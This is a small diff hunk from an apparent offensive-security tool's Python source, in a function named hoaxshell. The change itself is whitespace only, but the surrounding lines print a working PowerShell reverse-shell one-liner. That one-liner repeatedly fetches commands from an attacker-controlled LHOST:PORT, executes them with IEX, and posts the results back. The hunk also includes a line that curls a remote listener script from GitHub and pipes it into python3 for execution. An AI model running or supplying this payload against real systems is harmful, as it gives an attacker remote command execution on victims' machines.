@@ -80,8 +80,7 @@ def hoaxshell():
             cmd_command = f"""
             $s='{LHOST}:{PORT}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{{"Authorization"=$i}};while ($true){{$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{{"Authorization"=$i}});if ($c -ne 'None') {{$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{{"Authorization"=$i}} -Body ($e+$r)}}; sleep 0.8}}
             """
-
-
+            
             print(cmd_command)
 
             command = f'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t ps-iex-cm -p {PORT}'
